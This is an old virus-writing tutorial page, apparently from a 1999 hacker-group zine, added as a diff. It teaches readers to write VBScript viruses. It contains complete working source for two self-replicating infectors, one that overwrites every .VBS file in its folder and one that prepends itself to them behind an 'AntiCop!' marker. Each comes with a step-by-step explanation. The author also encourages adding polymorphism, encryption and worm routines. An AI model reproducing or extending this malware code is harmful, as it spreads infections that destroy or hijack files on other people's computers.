@@ -1,0 +1,313 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - A Phreaky Macro Primer 0.1 - Visual Basic Script</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<blockquote>
+  <PRE><b>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=
+                                                      ?    ?    ?        
+                                                        ?  ____  
+                                                          /    \ ?
+      A phreaky macro primer v0.1                     ?  / \ _  \  ?
+      .by jackie / Metaphase                            ( .o o.  ) ___
+                                                      __/   ^    \/   \
+                                                     /  \___o____      \
+=-=[ Visual Basic Script ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</b>
+
+     .Introduction to VBScripts
+     .The 'VBScript' basics
+     .The basic overwriting script
+     .The basic appender script
+
+
+   [ Music ]
+
+     .Metallica .S & M
+     .Sepultura .The roots of Sepultura [Roots Special Edition]
+
+
+<b>.Introduction</b>
+
+    Well, welcome to the VBS part. VBS stands for Visual Basic Script which
+is a scripting language for Windows. Normally you should use VBS to relieve
+your work with Windows,  but as every platform created by MicroSoft you can
+abuse it to write viruses. VBScript is very powerful because you can access
+the registry, etc.  So well, the first native VBScript virus was written by
+Lord Natas of the group CodeBreakers. You will find VBScript viruses mostly
+combined with worm routines for example for mIRC or pIRCH.  The only handi-
+cap in my eyes  is that you  are not able to use the Windows API system. ;(
+The Windows Scripting Host is just a nice viral platform, enjoy!
+
+
+<b>.Basics</b>
+
+    Aight, first you have to install the Windows Scripting Host on your sys
+tem to make  sure that the VBS files work.  You can download  the WSH files
+somewhere in  the mircosoft site.  After installation,  every file with the
+extension .VBS should get executed automaticly  with this scripting engine.
+To make a new VBScript file just  load your Notepad or any other plain text
+text editor and save the file with the extension '.VBS'. In VBS you can use
+different  Sub's or Function's like in VBA,  but this routines will not get
+executed if you not call them. Just take a look on my example.
+
+ Sub VBS_Rules()
+  MsgBox "This is a test"
+ End Sub
+
+    Well, if you have just this code in a VBScript file nothing will happen
+if you executed it.  To make it display the Message Box you need to use one
+of the two other examples.
+
+ Call VBS_Rules
+ Sub VBS_Rules()
+  MsgBox "This is a test"
+ End Sub
+
+    or better use this
+
+ MsgBox "This is a test"
+
+    in your blank script file. This last two code pieces do really the same
+and display a Message Box, just the first one has it's own Sub and the last
+one has no routine and is just a command in our file without any Sub.
+
+    To use the good  functions of VBScript you always  have to make ActiveX
+communications  with Windows.  The most common ones used  in every VBScript
+virus are the following.
+
+ Set FSO = CreateObject("Scripting.FileSystemObject")
+
+    This function creates and ActiveX communication object with the Windows
+File System Object. With this you can now get access on the common file
+commands like copying files, etc. Ok, that should be enough, if you still
+want more information on every command VBScript offers just go and download
+the papers and help files on the microsoft's site.
+
+<b>
+.The basic overwriting script</b>
+
+    In this section you  will learn how to  write a very  basic overwriting
+script virus.  I just wrote a  kind of instructional  virus for that so you
+find just the basics in it.
+
+---[ code starts here ]----------------------------------------------------
+
+On Error Resume Next
+
+Set FSO = CreateObject("Scripting.FileSystemObject")
+
+For Each PossibleFile in FSO.GetFolder(".").Files
+ If UCase(FSO.GetExtensionName(PossibleFile)) = "VBS" Then _
+  FSO.CopyFile Wscript.ScriptFullName, PossibleFile.Name, True
+Next
+
+---[ code ends here ]------------------------------------------------------
+
+    Now I will walk through the code for your better understanding.
+
+---------------------------------------------------------------------------
+On Error Resume Next
+---------------------------------------------------------------------------
+
+     You know this command well from VBA coding. It catches all errors that
+may occure will execution of your virus.
+
+---------------------------------------------------------------------------
+Set FSO = CreateObject("Scripting.FileSystemObject")
+---------------------------------------------------------------------------
+
+    Here we set the File System Object  into our object variable 'FSO'.  We
+need this object nearly the whole code.
+
+---------------------------------------------------------------------------
+For Each PossibleFile in FSO.GetFolder(".").Files
+---------------------------------------------------------------------------
+
+    Create an 'For Each' - 'Next' loop through all the files in the current
+directory. With this 'FSO.GetFolder(".")' you can get the current directory
+where the virus is present.
+
+---------------------------------------------------------------------------
+If UCase(FSO.GetExtensionName(PossibleFile)) = "VBS" Then _
+ FSO.CopyFile Wscript.ScriptFullName, PossibleFile.Name, True
+---------------------------------------------------------------------------
+
+    In our loop, we check if the extension is equal to  'VBS'  and get sure
+that the file we want to infect is a VBScript file. ;)  For the case that a
+user wrote his extension this way 'vBs' or something like that, we make the
+extension string upper case.  If the file is a VBScript file we copy the
+viral script file and overwrite the host file.
+
+---------------------------------------------------------------------------
+Next
+---------------------------------------------------------------------------
+
+    Jump to the next file in the current directory.
+
+    You can see that a basic overwriter in VBScript takes 4-5 lines of code
+and it is not the big thing but overwriters are very lame so go on with the
+appenders!
+
+<b>
+.The basic appender script</b>
+
+    As in binary viruses,  overwriters are the worse ones.  They are so de-
+structive. ;)  So one day someone thought about an  appending script virus.
+Well,  here I will also you just show how to write a basic appender with no
+special features like searchin in special folders or traversal routines. ;)
+Well,  I did a little cheesy graphic to show you how an script appender can
+look.
+
+  .------------.               .------------.
+  | Normal VBS |  -&gt; Virus -&gt;  |   Marker   |  If a virus finds a clean VBS
+  `------------´               .------------.  file it will write a marker,
+                               | Viral Code |  the viral code,  an end mark
+                               .------------.  and last  but not  least the
+                               |  End Mark  |  previous  code  of  the host
+                               .------------.  into the host file.
+                               | Host Code  |
+                               `------------´
+    As you see, very easy!
+
+---[ code starts here ]----------------------------------------------------
+ 
+'AntiCop!
+Set FSO = CreateObject("Scripting.FileSystemObject")
+
+Set OurFile = FSO.OpenTextFile(Wscript.ScriptFullName, 1)
+OurCode = OurFile.Read(639)
+OurFile.Close
+
+For Each PossibleFile In FSO.GetFolder(".").Files
+
+ If Ucase(FSO.GetExtensionName(PossibleFile.Name)) = "VBS" Then
+
+  Set VictimFile = FSO.OpenTextFile(PossibleFile.Path, 1)
+  Marker = VictimFile.Read(9)
+  VictimCode = Marker & VictimFile.ReadAll
+  VictimFile.Close
+
+  If Marker &lt;&gt; "'AntiCop!" Then
+   Set VictimFile = FSO.OpenTextFile(PossibleFile.Path, 2)
+   VictimFile.Write OurCode & VictimCode
+   VictimFile.Close
+  End If
+
+ End If
+
+Next
+'-&gt;
+
+---[ code ends here ]------------------------------------------------------
+
+    That you now better understand what I wrote here,  I will now walk as I
+always do step by step through the code.
+
+---------------------------------------------------------------------------
+'AntiCop!
+---------------------------------------------------------------------------
+
+    This string here ( 'AntiCop! ) is our infection marker. With this first
+line we check if the file is already infected.  The length of our marker is
+9 character, we need it later in code.
+
+---------------------------------------------------------------------------
+Set FSO = CreateObject("Scripting.FileSystemObject")
+---------------------------------------------------------------------------
+
+    Here we set the File System Object  into our object variable 'FSO'.  We
+need this object nearly the whole code.
+
+---------------------------------------------------------------------------
+Set OurFile = FSO.OpenTextFile(Wscript.ScriptFullName, 1)
+OurCode = OurFile.Read(639)
+OurFile.Close
+---------------------------------------------------------------------------
+
+    The next three lines of code do open the host file,  read the first 639
+characters out,  which is the length of our virus and  close it afterwards.
+The effective length of the virus is 639 characters and we don't really ap-
+pend to code after the file, we set it at the beginning. So if we are in an
+already infected file, we read our viral code, which is 639 char's long out
+and leave the normal code of the file alone.
+
+---------------------------------------------------------------------------
+For Each PossibleFile In FSO.GetFolder(".").Files
+---------------------------------------------------------------------------
+
+    Create an 'For Each' - 'Next' loop through all the files in the current
+directory. With this 'FSO.GetFolder(".")' you can get the current directory
+where the virus is present.
+
+---------------------------------------------------------------------------
+If Ucase(FSO.GetExtensionName(PossibleFile.Name)) = "VBS" Then
+---------------------------------------------------------------------------
+
+    In our loop, we check if the extension is equal to  'VBS'  and get sure
+that the file we want to infect is a VBScript file. ;)  For the case that a
+user wrote his extension this way 'vBs' or something like that, we make the
+extension string upper case.  If the file is a VBScript file we do the next
+commands.
+
+---------------------------------------------------------------------------
+Set VictimFile = FSO.OpenTextFile(PossibleFile.Path, 1)
+Marker = VictimFile.Read(9)
+VictimCode = Marker & VictimFile.ReadAll
+VictimFile.Close
+---------------------------------------------------------------------------
+
+    If we found a file that fits, we open it and read out the first 9 char-
+acters and save it into the variable 'Marker'.  We need it later to check a
+previous infection. Next, we save the contents of the variable 'Marker' and
+the rest of the file into the string 'VictimCode'. Close the file after all
+is done.
+
+---------------------------------------------------------------------------
+If Marker &lt;&gt; "'AntiCop!" Then
+ Set VictimFile = FSO.OpenTextFile(PossibleFile.Path, 2)
+ VictimFile.Write OurCode & VictimCode
+ VictimFile.Close
+End If
+---------------------------------------------------------------------------
+
+    Here we check if the first 9 characters  of the possible file are equal
+to our marker,  if they are not we open our victim  file for writing and do
+write our viral  code and the original code  of the victim file into it and
+of course close it, else we do nothing.
+
+---------------------------------------------------------------------------
+End If
+---------------------------------------------------------------------------
+
+    Remember this end of our condition? Well here we go if the file was not
+a VBScript file.
+
+---------------------------------------------------------------------------
+Next
+---------------------------------------------------------------------------
+
+    Jump to the next file in the current directory.
+
+---------------------------------------------------------------------------
+'-&gt;
+
+---------------------------------------------------------------------------
+
+    Well, this here is important,  after this marker the code of the victim
+file will be stored.
+
+
+    As you see,  writing an VBScript virus is not the big thing.  With this
+little nice scripting language you can write Windows - only viruses and you
+have really a big control over the whole Windows system. Just play around a
+bit with this! A good idea would be adding polymorphism or encryption and a
+worm routine. Well, just give it a try! Spotlight on JScript!
+
+                              -End Of Part #8-
+<b>
+=-=[EOF]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=</b>
+</PRE>
+</blockquote>
+</BODY>
+</HTML>
